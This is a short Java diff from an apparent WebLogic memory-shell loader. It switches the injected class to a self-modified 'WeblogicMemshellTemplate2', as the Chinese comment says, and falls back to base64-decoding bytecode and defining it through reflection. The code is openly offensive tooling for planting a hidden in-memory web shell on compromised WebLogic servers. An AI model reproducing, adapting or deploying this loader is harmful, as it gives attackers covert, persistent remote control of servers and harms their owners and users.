@@ -21,7 +21,8 @@ public class WeblogicMemshellLoader {
         byte[] bytes = Base64.decode(code);
         Class clz;
         try{
-            clz = classLoader.loadClass("com.feihong.template.WeblogicMemshellTemplate");
+            clz = classLoader.loadClass("com.feihong.template.WeblogicMemshellTemplate2");  // 自己修改的内存马类
+//            clz = classLoader.loadClass("com.feihong.template.WeblogicMemshellTemplate");
         }catch(Exception e){
             method.setAccessible(true);
             clz = (Class) method.invoke(classLoader, bytes, 0, bytes.length);
